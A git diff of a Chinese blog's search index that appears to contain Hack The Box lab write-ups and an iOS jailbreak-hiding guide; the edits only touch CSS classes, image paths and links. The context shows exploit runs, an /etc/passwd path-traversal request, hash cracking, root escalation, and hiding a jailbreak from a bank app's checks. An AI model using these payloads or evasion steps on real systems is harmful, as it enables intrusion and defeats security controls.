@@ -66,7 +66,7 @@
   <entry>
     <title>HTB-WingData</title>
     <url>/posts/1888ae71.html</url>
-    <content><![CDATA[<style>.bmtlxckdkkpe{zoom:50%;}</style><img src="/posts/undefined/d419202507a3bbf06e764c1c4a524f66.png" class="bmtlxckdkkpe" alt="htb-wingdata">
+    <content><![CDATA[<style>.othlagmpxhvj{zoom:50%;}</style><img src="/posts/1888ae71/d419202507a3bbf06e764c1c4a524f66.png" class="othlagmpxhvj" alt="htb-wingdata">
 
 <span id="more"></span>
 
@@ -99,14 +99,14 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.129.17.131 wingdata.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问80端口，右上角能获取到新的域名<code>ftp.wingdata.htb</code>，将新的域名添加本地解析</p>
-<img src="/posts/undefined/image-20260410195232053.png" class="" title="ftp">
+<img src="/posts/1888ae71/image-20260410195232053.png" class="" title="ftp">
 
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.129.17.131 ftp.wingdata.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
 
 <p>访问新链接，获取到cms 信息</p>
-<img src="/posts/undefined/image-20260410195346182.png" class="" title="ftp">
+<img src="/posts/1888ae71/image-20260410195346182.png" class="" title="ftp">
 
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>根据获取到的版本检索到漏洞利用脚本 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTIzNDc=">https://www.exploit-db.com/exploits/52347<i class="fa fa-external-link-alt"></i></span> ，反弹shell</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>根据获取到的版本检索到漏洞利用脚本 <a href="https://www.exploit-db.com/exploits/52347">https://www.exploit-db.com/exploits/52347</a> ，反弹shell</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 <span class="token number">2025</span>-47812.py <span class="token parameter variable">-u</span> http://ftp.wingdata.htb <span class="token parameter variable">-c</span> <span class="token function">whoami</span>
 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing target: http://ftp.wingdata.htb
@@ -144,7 +144,7 @@ anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
 </code></pre>
 
 <h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>在目录<code>/opt/wftpserver/Data/1/users</code> 中wacky.xml中可以获取到wacky 密码</p>
-<img src="/posts/undefined/image-20260410201837914.png" class="" title="image-20260410201837914">
+<img src="/posts/1888ae71/image-20260410201837914.png" class="" title="image-20260410201837914">
 
 <p>使用hashcat 破解密码</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP'</span> <span class="token operator">></span> pass.txt
@@ -185,9 +185,9 @@ User wacky may run the following commands on wingdata:
     <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
 </code></pre>
 
-<img src="/posts/undefined/image-20260410212410811.png" class="" title="image-20260410212410811">
+<img src="/posts/1888ae71/image-20260410212410811.png" class="" title="image-20260410212410811">
 
-<p>检索到漏洞利用脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0F6dXJlQURUcmVudC9DVkUtMjAyNS00NTE3LVBPQw==">https://github.com/AzureADTrent/CVE-2025-4517-POC<i class="fa fa-external-link-alt"></i></span> 上传到目标机器，运行可直接提权</p>
+<p>检索到漏洞利用脚本<a href="https://github.com/AzureADTrent/CVE-2025-4517-POC">https://github.com/AzureADTrent/CVE-2025-4517-POC</a> 上传到目标机器，运行可直接提权</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py 
 
 ╔═══════════════════════════════════════════════════════════╗
@@ -258,38 +258,38 @@ root@wingdata:/tmp<span class="token comment"># id</span>
   <entry>
     <title>iOS越狱隐藏</title>
     <url>/posts/6d3db75c.html</url>
-    <content><![CDATA[<style>.bmkuirscrtqr{zoom:50%;}</style><img src="/posts/6d3db75c/image-20260410151632410.png" class="bmkuirscrtqr" alt="越狱">
+    <content><![CDATA[<style>.cbhvyxzrrxim{zoom:50%;}</style><img src="/posts/6d3db75c/image-20260410151632410.png" class="cbhvyxzrrxim" alt="越狱">
 
 <span id="more"></span>
 
-<h3 id="安装GTA-Car-Tracker"><a href="#安装GTA-Car-Tracker" class="headerlink" title="安装GTA Car Tracker"></a>安装GTA Car Tracker</h3><p>使用safari浏览器访问 <span class="exturl" data-url="aHR0cHM6Ly9hcGkuamFpbGJyZWFrcy5hcHAvdHJvbGw2NGU=">https://api.jailbreaks.app/troll64e<i class="fa fa-external-link-alt"></i></span> ，弹出iTunes 打开，点击打开，选择安装</p>
-<style>.hvnwmrjcxtpc{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0003-0270768.PNG" class="hvnwmrjcxtpc" alt="IMG_0003"><style>.xuoixmmsypuu{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0004.PNG" class="xuoixmmsypuu" alt="IMG_0004">
+<h3 id="安装GTA-Car-Tracker"><a href="#安装GTA-Car-Tracker" class="headerlink" title="安装GTA Car Tracker"></a>安装GTA Car Tracker</h3><p>使用safari浏览器访问 <a href="https://api.jailbreaks.app/troll64e">https://api.jailbreaks.app/troll64e</a> ，弹出iTunes 打开，点击打开，选择安装</p>
+<style>.gdddunexgidx{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0003-0270768.PNG" class="gdddunexgidx" alt="IMG_0003"><style>.byebgcldtlbd{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0004.PNG" class="byebgcldtlbd" alt="IMG_0004">
 
-<style>.ohkeetzbqgws{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0005.PNG" class="ohkeetzbqgws" alt="IMG_0005"><style>.tqhcekacshwb{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0006.PNG" class="tqhcekacshwb" alt="IMG_0006">
+<style>.qkcqqhbozybt{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0005.PNG" class="qkcqqhbozybt" alt="IMG_0005"><style>.adqaqsueoefq{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0006.PNG" class="adqaqsueoefq" alt="IMG_0006">
 
 <h3 id="安装TrollStore"><a href="#安装TrollStore" class="headerlink" title="安装TrollStore"></a>安装TrollStore</h3><p>打开GTA Car Tracker 安装 TrollStore</p>
-<style>.smlplzegqswr{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0007.PNG" class="smlplzegqswr" alt="IMG_0007"><style>.bwzeomtbihmw{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0008.PNG" class="bwzeomtbihmw" alt="IMG_0008">
+<style>.ctsrgrppwhni{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0007.PNG" class="ctsrgrppwhni" alt="IMG_0007"><style>.rzourlasbjhf{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0008.PNG" class="rzourlasbjhf" alt="IMG_0008">
 
 <p>打开TrollStore 安装Idid，Persistence Helper (可选，安装后重启TrollStore不失效) </p>
-<style>.wipriyivnekf{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0010.PNG" class="wipriyivnekf" alt="IMG_0010">  
+<style>.xmlsscqfyutr{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0010.PNG" class="xmlsscqfyutr" alt="IMG_0010">  
 
 
 
-<h3 id="安装RootHide-Dopamine"><a href="#安装RootHide-Dopamine" class="headerlink" title="安装RootHide Dopamine"></a>安装RootHide Dopamine</h3><p>访问 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Jvb3RoaWRlL0RvcGFtaW5lMi1yb290aGlkZQ==">https://github.com/roothide/Dopamine2-roothide<i class="fa fa-external-link-alt"></i></span> 下载最新版的    Dopamine.tipa  放到iPhone 的Download 目录下然后使用TrollStore安装；打开TrollStore，右上角 “+” ，选中要安装的Dopamine.tipa ，然后安装</p>
-<style>.eoxecpvonuew{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0011.PNG" class="eoxecpvonuew" alt="IMG_0011"> 
+<h3 id="安装RootHide-Dopamine"><a href="#安装RootHide-Dopamine" class="headerlink" title="安装RootHide Dopamine"></a>安装RootHide Dopamine</h3><p>访问 <a href="https://github.com/roothide/Dopamine2-roothide">https://github.com/roothide/Dopamine2-roothide</a> 下载最新版的    Dopamine.tipa  放到iPhone 的Download 目录下然后使用TrollStore安装；打开TrollStore，右上角 “+” ，选中要安装的Dopamine.tipa ，然后安装</p>
+<style>.sfhazjzzldyr{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0011.PNG" class="sfhazjzzldyr" alt="IMG_0011"> 
 
 <h3 id="越狱和隐藏越狱"><a href="#越狱和隐藏越狱" class="headerlink" title="越狱和隐藏越狱"></a>越狱和隐藏越狱</h3><p>打开Dopamine，然后点击最下面越狱，选择安装Sileo或者全选，越狱完成，桌面会出现RootHide (如果没有可以到Sileo 里搜索安装)</p>
-<style>.nubgwtdwvfep{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0012.PNG" class="nubgwtdwvfep" alt="IMG_0012"><style>.bxnbfxpempqd{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0013.PNG" class="bxnbfxpempqd" alt="IMG_0013">
+<style>.wwpllewuwuci{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0012.PNG" class="wwpllewuwuci" alt="IMG_0012"><style>.khxydpinmxek{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0013.PNG" class="khxydpinmxek" alt="IMG_0013">
 
 
 
 <p>打开RootHide，点击var 清理，左上角选择全部，点击右上角清理</p>
-<style>.cbrbzxjtgwgx{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0014.PNG" class="cbrbzxjtgwgx" alt="IMG_0014"> 
+<style>.isogpiehvcab{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0014.PNG" class="isogpiehvcab" alt="IMG_0014"> 
 
 <h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>重新下载安装app，并将app 加入黑名单；使用某银行app测试效果；</p>
-<h4 id="未打开黑名单无法正常使用-app"><a href="#未打开黑名单无法正常使用-app" class="headerlink" title="未打开黑名单无法正常使用 app"></a>未打开黑名单无法正常使用 app</h4><style>.xajmruxhbfxn{zoom: 37%;}</style><img src="/posts/6d3db75c/image-20260205144231485.png" class="xajmruxhbfxn" alt="image-20260205144231485"><style>.cjvrkrhkpvye{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0017.PNG" class="cjvrkrhkpvye" alt="IMG_0017">
+<h4 id="未打开黑名单无法正常使用-app"><a href="#未打开黑名单无法正常使用-app" class="headerlink" title="未打开黑名单无法正常使用 app"></a>未打开黑名单无法正常使用 app</h4><style>.mmsauvyhbutg{zoom: 37%;}</style><img src="/posts/6d3db75c/image-20260205144231485.png" class="mmsauvyhbutg" alt="image-20260205144231485"><style>.niyfoyhsfpdn{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0017.PNG" class="niyfoyhsfpdn" alt="IMG_0017">
 
-<h4 id="打开黑名单后app正常"><a href="#打开黑名单后app正常" class="headerlink" title="打开黑名单后app正常"></a>打开黑名单后app正常</h4><style>.ixyltmwntlln{zoom: 37%;}</style><img src="/posts/6d3db75c/image-20260205144409713.png" class="ixyltmwntlln" alt="image-20260205144409713"><style>.tqruzppxswqp{zoom: 25%;}</style><img src="/posts/6d3db75c/IMG_0019.PNG" class="tqruzppxswqp" alt="IMG_0019">
+<h4 id="打开黑名单后app正常"><a href="#打开黑名单后app正常" class="headerlink" title="打开黑名单后app正常"></a>打开黑名单后app正常</h4><style>.avjspllhywiv{zoom: 37%;}</style><img src="/posts/6d3db75c/image-20260205144409713.png" class="avjspllhywiv" alt="image-20260205144409713"><style>.flceustjsatb{zoom: 25%;}</style><img src="/posts/6d3db75c/IMG_0019.PNG" class="flceustjsatb" alt="IMG_0019">
 
 
 
@@ -305,7 +305,7 @@ root@wingdata:/tmp<span class="token comment"># id</span>
   <entry>
     <title>HTB-Facts</title>
     <url>/posts/a66eeeb7.html</url>
-    <content><![CDATA[<style>.ywdngvmhohyg{zoom:50%;}</style><img src="/posts/a66eeeb7/bdcd209c32f156fbfb2268f099971f75.png" class="ywdngvmhohyg" alt="HTB-facts">
+    <content><![CDATA[<style>.pqpsuijhtsys{zoom:50%;}</style><img src="/posts/a66eeeb7/bdcd209c32f156fbfb2268f099971f75.png" class="pqpsuijhtsys" alt="HTB-facts">
 
 <span id="more"></span>
 
@@ -374,7 +374,7 @@ ajax                    <span class="token punctuation">[</span>Status: <span cl
 <p>注册账号试试，发现可以注册并且登录</p>
 <img src="/posts/a66eeeb7/image-20260409135832986.png" class="" title="注册">
 
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>登录后台可以找到cms 信息和版本，根据信息检索到 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FmaWZ1ZGlubXRvcC9DYW1hbGVvbi1DTVMtMi45LjAtVnVsbg==">https://github.com/afifudinmtop/Camaleon-CMS-2.9.0-Vuln<i class="fa fa-external-link-alt"></i></span> 有两个CVE CVE-2025-2304和CVE-2024-46987 </p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>登录后台可以找到cms 信息和版本，根据信息检索到 <a href="https://github.com/afifudinmtop/Camaleon-CMS-2.9.0-Vuln">https://github.com/afifudinmtop/Camaleon-CMS-2.9.0-Vuln</a> 有两个CVE CVE-2025-2304和CVE-2024-46987 </p>
 <img src="/posts/a66eeeb7/image-20260409140026432.png" class="" title="image-20260409140026432">
 
 <h3 id="LFI-CVE-2024-46987"><a href="#LFI-CVE-2024-46987" class="headerlink" title="LFI (CVE-2024-46987 )"></a>LFI (CVE-2024-46987 )</h3><p>使用burp 请求 <code>admin/media/download_private_file?file=../../../../../../etc/passwd</code>可以获取到&#x2F;etc&#x2F;passwd，通过LFI可以直接读取flag</p>
@@ -451,7 +451,7 @@ $ <span class="token function">chmod</span> <span class="token number">600</span
 $ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_ed25519 trivia@facts.htb 
 Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_ed25519'</span><span class="token builtin class-name">:</span> </code></pre>
 
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>sudo -l 发现facter，通过检索 <span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5vcmcvZ3Rmb2JpbnMvZmFjdGVyLw==">https://gtfobins.org/gtfobins/facter/<i class="fa fa-external-link-alt"></i></span> 发现目录底下第一个ruby 文件会被执行</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>sudo -l 发现facter，通过检索 <a href="https://gtfobins.org/gtfobins/facter/">https://gtfobins.org/gtfobins/facter/</a> 发现目录底下第一个ruby 文件会被执行</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">trivia@facts:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
 Matching Defaults entries <span class="token keyword">for</span> trivia on facts:
     env_reset, mail_badpass,
@@ -518,7 +518,7 @@ bash-5.2<span class="token comment"># cat /root/root.txt</span></code></pre>
   <entry>
     <title>HTB-Imagery</title>
     <url>/posts/3872553c.html</url>
-    <content><![CDATA[<style>.ujcvklgqhmjn{zoom:50%;}</style><img src="/posts/3872553c/image-20251004154017644.png" class="ujcvklgqhmjn" alt="HTB-Imagery">
+    <content><![CDATA[<style>.gtvplrtjobec{zoom:50%;}</style><img src="/posts/3872553c/image-20251004154017644.png" class="gtvplrtjobec" alt="HTB-Imagery">
 
 <span id="more"></span>
 
@@ -587,7 +587,7 @@ Dictionary cache hit:
 
 2c65c8d7bfbca32a3ed42596192384f6:iambatman                                                                </code></pre>
 
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>使用账号<span class="exturl" data-url="bWFpbHRvOiYjMTE2OyYjeDY1OyYjMTE1OyYjMTE2OyYjMTE3OyYjeDczOyYjMTAxOyYjeDcyOyYjeDQwOyYjeDY5OyYjeDZkOyYjOTc7JiMxMDM7JiN4NjU7JiMxMTQ7JiN4Nzk7JiM0NjsmI3g2ODsmIzExNjsmIzk4Ow==">testuser@imagery.htb<i class="fa fa-external-link-alt"></i></span> 和破解出的密码登录目标站点，随便上传一张图片，点击<code>Transform Image</code> </p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>使用账号<a href="mailto:&#116;&#x65;&#115;&#116;&#x75;&#x73;&#101;&#114;&#64;&#x69;&#x6d;&#x61;&#103;&#x65;&#x72;&#121;&#x2e;&#x68;&#x74;&#98;">testuser@imagery.htb</a> 和破解出的密码登录目标站点，随便上传一张图片，点击<code>Transform Image</code> </p>
 <img src="/posts/3872553c/image-20251004165324958.png" class="" title="Transform image">
 
 <p>选择Crop，点击<code>Apply Transformation</code> , 抓包修改参数 <code>y</code> </p>
@@ -721,7 +721,7 @@ root</code></pre>
   <entry>
     <title>HTB-Expressway</title>
     <url>/posts/84373dcc.html</url>
-    <content><![CDATA[<style>.rfpsmepfidwr{zoom:50%;}</style><img src="/posts/84373dcc/75c168f01f04e5f256838733b77f13ec.png" class="rfpsmepfidwr" alt="HTB-Expressway">
+    <content><![CDATA[<style>.wtwobsrqsmwq{zoom:50%;}</style><img src="/posts/84373dcc/75c168f01f04e5f256838733b77f13ec.png" class="wtwobsrqsmwq" alt="HTB-Expressway">
 
 <span id="more"></span>
 
@@ -846,7 +846,7 @@ Sudoers <span class="token function">file</span> grammar version <span class="to
 Sudoers I/O plugin version <span class="token number">1.9</span>.17
 Sudoers audit plugin version <span class="token number">1.9</span>.17</code></pre>
 
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用搜索引擎检索sudo 1.9.17 的exploit 可以找到<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTIzNTQ=">CVE-2025-32462<i class="fa fa-external-link-alt"></i></span> 使用获取到的子域名可以成功利用</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用搜索引擎检索sudo 1.9.17 的exploit 可以找到<a href="https://www.exploit-db.com/exploits/52354">CVE-2025-32462</a> 使用获取到的子域名可以成功利用</p>
 <img src="/posts/84373dcc/image-20251003212605446.png" class="" title="Google">
 
 <pre class="language-bash" data-language="bash"><code class="language-bash">ike@expressway:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-h</span> offramp.expressway.htb
@@ -888,7 +888,7 @@ root@expressway:~<span class="token comment"># id</span>
   <entry>
     <title>HTB-Editor</title>
     <url>/posts/fe14f7bb.html</url>
-    <content><![CDATA[<style>.rscemgfwqjtb{zoom:50%;}</style><img src="/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png" class="rscemgfwqjtb" alt="HTB-Editor">
+    <content><![CDATA[<style>.oiivjgmgxsqt{zoom:50%;}</style><img src="/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png" class="oiivjgmgxsqt" alt="HTB-Editor">
 
 <span id="more"></span>
 
@@ -949,7 +949,7 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <p>添加本地域名映射</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.80 editor.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts  </code></pre>
 
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <span class="exturl" data-url="aHR0cDovL2VkaXRvci5odGI6ODA4MC94d2lraS9iaW4vdmlldy9NYWluLw==">http://editor.htb:8080/xwiki/bin/view/Main/<i class="fa fa-external-link-alt"></i></span> 可以看到目标是XWiki 15.10.8 ，通过Google可以检索到CVE-2025-24893，下载poc</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <a href="http://editor.htb:8080/xwiki/bin/view/Main/">http://editor.htb:8080/xwiki/bin/view/Main/</a> 可以看到目标是XWiki 15.10.8 ，通过Google可以检索到CVE-2025-24893，下载poc</p>
 <img src="/posts/fe14f7bb/image-20250818201422605.png" class="" title="image-20250818201422605">
 
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 CVE-2025-24893.py <span class="token parameter variable">--url</span> <span class="token string">"http://editor.htb:8080/xwiki"</span> <span class="token parameter variable">--command</span> <span class="token string">"id"</span>
@@ -1053,7 +1053,7 @@ root@editor:/tmp<span class="token comment"># id</span>
   <entry>
     <title>HTB-Bashed</title>
     <url>/posts/f52f847.html</url>
-    <content><![CDATA[<style>.qlbdbswyavtn{zoom:50%;}</style><img src="/posts/f52f847/0f058b73659ca043de9f5240abd651ca.png" class="qlbdbswyavtn" alt="Bashed">
+    <content><![CDATA[<style>.khoovtaikkph{zoom:50%;}</style><img src="/posts/f52f847/0f058b73659ca043de9f5240abd651ca.png" class="khoovtaikkph" alt="Bashed">
 
 <span id="more"></span>
 
@@ -1203,7 +1203,7 @@ root@bashed:/scripts<span class="token comment"># id       </span>
   <entry>
     <title>HTB-Irked</title>
     <url>/posts/b88b7678.html</url>
-    <content><![CDATA[<style>.naoxglpdjtto{zoom:50%;}</style><img src="/posts/b88b7678/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="naoxglpdjtto">
+    <content><![CDATA[<style>.ldnvpmmmsycp{zoom:50%;}</style><img src="/posts/b88b7678/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="ldnvpmmmsycp">
 
 <span id="more"></span>
 
@@ -1397,7 +1397,7 @@ djmardov@irked:~$ <span class="token function">id</span>
   <entry>
     <title>HTB-Nocturnal</title>
     <url>/posts/5cd9a843.html</url>
-    <content><![CDATA[<style>.wcgnvnbhfgrc{zoom:50%;}</style><img src="/posts/5cd9a843/f6a56cec6e9826b4ed124fb4155abc66.png" class="wcgnvnbhfgrc">
+    <content><![CDATA[<style>.aumxfhbbning{zoom:50%;}</style><img src="/posts/5cd9a843/f6a56cec6e9826b4ed124fb4155abc66.png" class="aumxfhbbning">
 
 <span id="more"></span>
 
@@ -1820,7 +1820,7 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
   <entry>
     <title>HTB-Previse</title>
     <url>/posts/21913e3f.html</url>
-    <content><![CDATA[<style>.jyogwuutrkyp{zoom:50%;}</style><img src="/posts/21913e3f/e3c542ada4b134e29e534e3081ef9650.png" class="jyogwuutrkyp">
+    <content><![CDATA[<style>.ejkkkjujqzpu{zoom:50%;}</style><img src="/posts/21913e3f/e3c542ada4b134e29e534e3081ef9650.png" class="ejkkkjujqzpu">
 
 <span id="more"></span>
 
@@ -2048,7 +2048,7 @@ root@previse:/tmp<span class="token comment"># id      </span>
   <entry>
     <title>HTB-Busqueda</title>
     <url>/posts/d91931aa.html</url>
-    <content><![CDATA[<style>.cpsrczfkrcct{zoom:50%;}</style><img src="/posts/d91931aa/a6942ab57b6a79f71240420442027334.png" class="cpsrczfkrcct">
+    <content><![CDATA[<style>.ckupxwcniitx{zoom:50%;}</style><img src="/posts/d91931aa/a6942ab57b6a79f71240420442027334.png" class="ckupxwcniitx">
 
 <span id="more"></span>
 
@@ -2309,7 +2309,7 @@ connect to <span class="token punctuation">[</span><span class="token number">10
   <entry>
     <title>HTB-Sauna</title>
     <url>/posts/5551a214.html</url>
-    <content><![CDATA[<style>.hsqhkwttgcyx{zoom:50%;}</style><img src="/posts/5551a214/f31d5d0264fadc267e7f38a9d7729d14.png" class="hsqhkwttgcyx">
+    <content><![CDATA[<style>.mecnuesknurm{zoom:50%;}</style><img src="/posts/5551a214/f31d5d0264fadc267e7f38a9d7729d14.png" class="mecnuesknurm">
 
 <span id="more"></span>
 
@@ -2575,7 +2575,7 @@ nt authority<span class="token punctuation">\</span>system
   <entry>
     <title>HTB-Heist</title>
     <url>/posts/4a8e4133.html</url>
-    <content><![CDATA[<style>.igtqyixnyhsu{zoom:50%;}</style><img src="/posts/4a8e4133/131dbaba68b169bd5ff59ac09420b09f.png" class="igtqyixnyhsu">
+    <content><![CDATA[<style>.msyqfjjkfnvl{zoom:50%;}</style><img src="/posts/4a8e4133/131dbaba68b169bd5ff59ac09420b09f.png" class="msyqfjjkfnvl">
 
 <span id="more"></span>
 
@@ -2871,7 +2871,7 @@ Mode                LastWriteTime         Length Name
   <entry>
     <title>HTB-Toolbox</title>
     <url>/posts/96a67a56.html</url>
-    <content><![CDATA[<style>.ssmafkzduicx{zoom:50%;}</style><img src="/posts/96a67a56/9d218e64149bfb00a002d94868f2e4b1.png" class="ssmafkzduicx">
+    <content><![CDATA[<style>.sxwyckkxffju{zoom:50%;}</style><img src="/posts/96a67a56/9d218e64149bfb00a002d94868f2e4b1.png" class="sxwyckkxffju">
 
 <span id="more"></span>
 
@@ -3220,7 +3220,7 @@ administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class
   <entry>
     <title>HTB-Mirai</title>
     <url>/posts/c3392160.html</url>
-    <content><![CDATA[<style>.swwcehndamdf{zoom:50%;}</style><img src="/posts/c3392160/4ef1ea77e69185063d4200d7d0142baa.png" class="swwcehndamdf">
+    <content><![CDATA[<style>.nnpwwziqbtrr{zoom:50%;}</style><img src="/posts/c3392160/4ef1ea77e69185063d4200d7d0142baa.png" class="nnpwwziqbtrr">
 
 <span id="more"></span>
 
@@ -3271,7 +3271,7 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <p>添加本地域名解析到hosts</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.48 mirai.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
 
-<p>访问目标 <span class="exturl" data-url="aHR0cDovL21pcmFpLmh0Yi8=">http://mirai.htb<i class="fa fa-external-link-alt"></i></span> ,右键查看源码，找到一个路径</p>
+<p>访问目标 <a href="http://mirai.htb/">http://mirai.htb</a> ,右键查看源码，找到一个路径</p>
 <img src="/posts/c3392160/image-20250302122107403.png" class="" title="源码">访问/admin 可以看到是树苺派
 
 <img src="/posts/c3392160/image-20250302122612935.png" class="" title="面板">
@@ -3407,7 +3407,7 @@ Do you know <span class="token keyword">if</span> there is any way to get them b
   <entry>
     <title>HTB-Blocky</title>
     <url>/posts/1cdd7a67.html</url>
-    <content><![CDATA[<style>.jmkgjykkbkin{zoom:50%;}</style><img src="/posts/1cdd7a67/f412784c311bdf52c3655381d2c9cd21.png" class="jmkgjykkbkin">
+    <content><![CDATA[<style>.fcfqgmzhuuqg{zoom:50%;}</style><img src="/posts/1cdd7a67/f412784c311bdf52c3655381d2c9cd21.png" class="fcfqgmzhuuqg">
 
 <span id="more"></span>
 
@@ -3451,7 +3451,7 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问网站可以看到cms为WordPress，可以在文章中找到一个用户名(notch)</p>
 <img src="/posts/1cdd7a67/image-20250302111220868.png" class="" title="目标">
 
-<p>使用ffuf 对目录进行扫描，访问 <span class="exturl" data-url="aHR0cDovL2Jsb2NreS5odGIvcGx1Z2lucw==">http://blocky.htb/plugins<i class="fa fa-external-link-alt"></i></span> 发现两个jar包：griefprevention-1.11.2-3.1.1.298.jar 和 BlockyCore.jar</p>
+<p>使用ffuf 对目录进行扫描，访问 <a href="http://blocky.htb/plugins">http://blocky.htb/plugins</a> 发现两个jar包：griefprevention-1.11.2-3.1.1.298.jar 和 BlockyCore.jar</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://blocky.htb/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>  
 
         /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
@@ -3554,7 +3554,7 @@ root@Blocky:~<span class="token comment"># id</span>
   <entry>
     <title>HTB-Remote</title>
     <url>/posts/685379b3.html</url>
-    <content><![CDATA[<style>.xfnwjjwcdpau{zoom:50%;}</style><img src="/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png" class="xfnwjjwcdpau">
+    <content><![CDATA[<style>.urxpdoyzpedm{zoom:50%;}</style><img src="/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png" class="urxpdoyzpedm">
 
 <span id="more"></span>
 
